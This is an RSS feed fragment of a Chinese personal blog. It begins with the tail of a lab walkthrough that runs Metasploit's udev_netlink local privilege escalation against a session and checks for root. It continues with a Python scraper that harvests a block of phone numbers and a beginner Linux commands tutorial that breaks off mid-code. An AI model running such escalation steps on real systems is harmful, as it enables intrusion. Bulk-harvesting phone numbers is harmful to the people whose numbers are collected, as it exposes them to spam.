<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样我们就获取到最高权限了，如图:</p>
<p></p>
<p>我们来看看用户是不是root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span></code></pre></td></tr></table>
</div>
</div><p>或</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图</p>
<p></p>
<p>然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。</p>
<hr>
<h2 id="结语">结语</h2>
<p>写了一个礼拜，全是即操作即写</p>
<p>看完还不会的，，，在下面留言吧..</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">ArchWiki</a></p>
</li>
<li>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">Metasploitable下载地址</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/av59729967" target="_blank" rel="noopener noreffer">由帝的sqlmap视频</a></p>
</li>
</ul>
<hr>
<p><strong>注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关</strong></p>
]]></description>
</item><item>
    <title>Python学习笔记 简单爬虫</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</link>
    <pubDate>Tue, 13 Aug 2019 22:20:53 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-ey71wo.jpg" referrerpolicy="no-referrer">
            </div><h2 id="一如既往不正经的前言">一如既往不正经的前言</h2>
<p>嘿嘿，我又回来了，今天在U盘里弄好了hexo，现在可以继续更新了</p>
<p><del>并且这次博客添加了访问量统计，欢迎扩～</del></p>
<p>那么，本期更新一个简单的Python爬虫</p>
<h2 id="爬虫原理">爬虫原理</h2>
<blockquote>
<p>小白: 大佬大佬～爬虫是啥啊？</p>
<p>大佬: 去搜索引擎查呀</p>
<p>小白: 查了，还是看不懂</p>
<p>大佬: emmmmm..那你继续往下看吧…</p>
</blockquote>
<h3 id="概述">概述</h3>
<p>2333,爬虫其实很好理解</p>
<p>我们都知道上网是用浏览器的，那么我们具体是怎样访问一个网页的呢？看下面吧(懒得画图了)</p>
<blockquote>
<ol>
<li>
<p>浏览器 –发送一个请求www.bing.com –&gt;</p>
</li>
<li>
<p>服务器 &lt;–接受到请求-–</p>
</li>
<li>
<p>服务器 –做出响应–&gt; –返回数据–&gt; 浏览器</p>
</li>
</ol>
</blockquote>
<p>什么？还是不了解？那我们用浏览器来看一下吧，我们随便打开一个网页</p>
<p></p>
<p>以Chrome/Chromiun为例，接下来依次点击 <code>鼠标右键——检查——NetWork——将Preserve log打上勾 </code>，然后刷新 就会发现出现了以下内容</p>
<p></p>
<p>我们可以看到浏览器很详细的把请求内容显示出来了，而左边那些列表，你已经获取了这个网站的内容。</p>
<p>爬虫的原理就是把这些过程自动化，不需要我们去手动访问，就可以把网页中你想要的信息和内容爬取下来。</p>
<h3 id="爬虫的作用">爬虫的作用</h3>
<p>举个例子，这里有一个 <del><a href="http://www.hiphop8.com/" target="_blank" rel="noopener noreffer">全国号码段(链接已失效)</a></del> 的网站，我们需要取一个城市中其中一个号码段的所有的号码。比如西安市</p>
<p></p>
<p></p>
<p>可以看到，号码段有很多，每个段有一万个号码。这个时候怎么办呢？总不可能用鼠标一条一条的去复制粘贴吧？这个时候爬虫就派上用场了。</p>
<blockquote>
<p>其实也可以用来爬取我的博客，当更新的时候就可以及时收到更新信息</p>
<p>啊啊别打我，疼疼疼</p>
</blockquote>
<h2 id="编程语言的选择">编程语言的选择</h2>
<p>我们如果要进行爬虫工作，那么就必须使用编程语言，用得最多的是<strong>Python</strong>，因为Python进行爬虫是比较简便的，当然也可以选择其他的比如<strong>C/C++</strong>、<strong>Java</strong>等，甚至是<strong>易语言</strong>都可以做到，只不过难易度和写法不同，目的和功能都是一样的。本期我们选择Python</p>
<h2 id="python的安装">Python的安装</h2>
<p>Python是跨平台的语言，所以平台不同安装方法也有所不同。</p>
<h3 id="windows">Windows</h3>
<p>可以到<a href="https://www.python.org/" target="_blank" rel="noopener noreffer">Python的官网</a>去下载安装程序并安装，建议下载Python3</p>
<h3 id="mac-osx">Mac OSX</h3>
<p>同样到<a href="https://www.python.org/" target="_blank" rel="noopener noreffer">Python的官网</a>下载</p>
<h3 id="linux">Linux</h3>
<p>Linux则在包管理器安装即可</p>
<h4 id="deb系">deb系</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt-get install python3
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="arch系">Arch系</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S python
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="rpm系">rpm系</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo yum install python3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="android">Android</h3>
<p>Android平台则安装QPython即可，</p>
<p><a href="https://www.coolapk.com/apk/com.hipipal.qpy3" target="_blank" rel="noopener noreffer">到酷安安装</a></p>
<p><a href="https://www.qpython.com/" target="_blank" rel="noopener noreffer">QPython官网</a></p>
<h2 id="安装pip">安装pip</h2>
<p>Windows和Mac OSX的安装程序会自动装上pip，而Linux则不会，需要手动安装。</p>
<blockquote>
<p>什么？你问我Android？我也不知道2333</p>
</blockquote>
<p>首先打开<a href="https://pypi.org/project/pip/#files" target="_blank" rel="noopener noreffer">这个网页</a>，然后点击<strong>Download</strong>，下载第二个tar.gz文件，这是个Linux压缩文件。</p>
<p>然后解压它，就会得到一个<code>pip-19.2.2目录</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tar -xvf pip-19.2.2.tar.gz
</span></span></code></pre></td></tr></table>
</div>
</div><p>cd进去</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> ./pip-19.2.2
</span></span></code></pre></td></tr></table>
</div>
</div><p>下面有一个 <strong><code>setup.py</code></strong> 文件，用python执行它即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo python setup.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>之后就会自动安装好pip了。</p>
<h2 id="需要安装的模块">需要安装的模块</h2>
<p>我的爬虫用到了以下模块：</p>
<ul>
<li>requests，网页请求模块</li>
<li>BeautifulSoup，分析模块</li>
</ul>
<p>安装命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pip install requests BeautifulSoup
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果感觉到速度很慢，则参考<a href="https://www.cnblogs.com/microman/p/6107879.html" target="_blank" rel="noopener noreffer">这里</a>更换国内镜像源。</p>
<h2 id="代码公开">代码公开</h2>
<p>这里公开一下获取手机号的简单爬虫代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;简易手机号码抓取工具 By WeepingDogel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://www.hiphop8.com/mobile/xian_1319339.html&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">page</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">page_info</span><span class="o">=</span><span class="n">page</span><span class="o">.</span><span class="n">content</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">page_info</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">numbers</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1319339.txt&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">number</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="o">.</span><span class="n">string</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将代码复制到一个py文件中运行或修改即可。</p>
<h2 id="最后">最后</h2>
<p>写得比较仓促，所以可能不够详细，请谅解。<del>下方有评论区，欢迎评论(Tu Cao)。</del></p>
]]></description>
</item><item>
    <title>Linux 基础命令</title>
    <link>http://weepingdogel.github.io/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</link>
    <pubDate>Mon, 05 Aug 2019 15:05:06 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/linux-arm.png" referrerpolicy="no-referrer">
            </div><p><em><strong>提示：面向萌新，大佬勿喷</strong></em></p>
<p>刚入门Linux难免会觉得很麻烦，因为不知道如何使用命令去操作，这样的话在Linux系统是寸步难行的，但是学会了一些基础命令以后就能无压力的操作了，想不想学会Linux？那就让我们从简单的文件操作开始吧。</p>
<h2 id="如何使用命令行">如何使用命令行</h2>
<p>如果你的发行版自带图形界面的话，可以从图形界面的菜单中找到一个叫 <strong>“终端”</strong> 的东西，打开它，就可以使用命令了。如果你的发行版不带图形界面，那么在tty登录用户以后就可以直接使用了。</p>
<p>注意，这个终端不等于<strong>DOS</strong>也不等于<strong>cmd</strong>，它和windows是没有办毛钱关系的，是另一种东西。</p>
<h2 id="cd命令">cd命令</h2>
<p>如果你之前用过DOS或者经常使用windows的cmd，你就会知道这个命令了，这个命令在大多数操作系统中都有。</p>
<p>cd命令是”change directory”的缩写，也就是改变你当前所在的目录，后面可以加相对路径，也可以加上绝对路径。</p>
<p>简单的理解，就是进入一个文件夹。</p>
<h3 id="用法">用法</h3>
<p>测试目录:<code>/a/b/c</code></p>
<h4 id="进入某个目录">进入某个目录:</h4>
<p>绝对路径：指定一个完整的路径，与自己当前所在的目录无关</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ <span class="nb">cd</span> /a/b/c <span class="c1"># 进入/a/b/c这个路径中的目录c</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>相对路径：指定当前目录上级目录下的其他目录或下级中的一个目录 指定下一级(常用)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$ <span class="nb">cd</span> ./c <span class="c1"># 进入当前所在/a/b目录下面的目录c</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>指定上一级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$ <span class="nb">cd</span> ../xxx <span class="c1">#进入当前所在目录/a/b中的/a目录下的其他目录</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost xxx<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="退出某个目录">退出某个目录:</h4>
<p>有人可能不知道，进入了目录以后怎么退出来，那么这个时候就要用到cd ..命令了。</p>
<p>返回上一级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> .. <span class="c1"># 从当前所在的目录/a/b/c返回上一级的目录/a/b</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost b<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>返回上两级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ../.. <span class="c1"># 从当前所在的目录/a/b/c返回上两级的目录/a</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwd命令">pwd命令</h2>
<p>这个命令是用来辅助上面的cd命令的，它的作用是查看当前所在的绝对路径。</p>
<h3 id="用法-1">用法</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">/home/weepingdogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>假如当前所在目录为/a/b/c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">/a/b/c
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然只有一个作用，但是却很重要，因为新手每天都会用到，bash或者部分zsh主题是不会显示绝对路就的，如果你不知道你当前在操作哪个目录，你就得用上pwd这个命令了。</p>
<h2 id="ls命令">ls命令</h2>
<p>这个命令相当于windows中的<strong>dir</strong>，作用是显示当前目录下的所有的文件和目录。</p>
<h3 id="用法-2">用法</h3>
<p>测试目录<code>/tmp/a/b/c</code></p>
<p>直接查看</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls <span class="c1"># 查看当前目录下面的文件</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  文本.txt  <span class="nb">test</span>  wiaori <span class="c1"># 被列出的文件</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>列表式查看，参数-l</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -l
</span></span><span class="line"><span class="cl"><span class="c1">#按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>易读列表查看，参数-lh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>按时间排序的易读列表查看，参数-lh &ndash;sort=time</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh --sort<span class="o">=</span><span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>按文件大小排序的易读列表查看，参数-lh &ndash;sort=size</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh --sort<span class="o">=</span>size
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>更多用法等你自己去摸索了</p>
<h2 id="文件复制与移动">文件复制与移动</h2>
<h3 id="mv命令">mv命令</h3>
<p>这个命令是英文单词<strong>move</strong>的缩写。</p>
<p>它的作用主要是移动某些文件到指定的位置，你可以指定绝对路径，但是如果离得比较近的话就可以使用相对路径。</p>
<h4 id="用法-3">用法</h4>
<h5 id="绝对路径用法">绝对路径用法：</h5>
<p>比如我们把 <strong>“目录c”</strong> 下面的 <strong>“文本.txt”</strong> 移动到<code>/tmp/a/</code>下面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mv /tmp/a/b/c/文本.txt /tmp/a/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被移动了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们切换到<code>/tmp/a/</code>下面看看吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> /tmp/a
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl">文本.txt  b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时我们就看到了那个 <strong>“文本.txt”</strong> 被移动到了<code>/tmp/a/</code>下面了。</p>
<h5 id="相对路径用法">相对路径用法：</h5>
<p>那么我们用另一种方法把这个文件移回去吧，首先我们还在这个<code>/tmp/a/</code>下面，那么命令如下</p>
<div class="highlight"><div class="chroma">
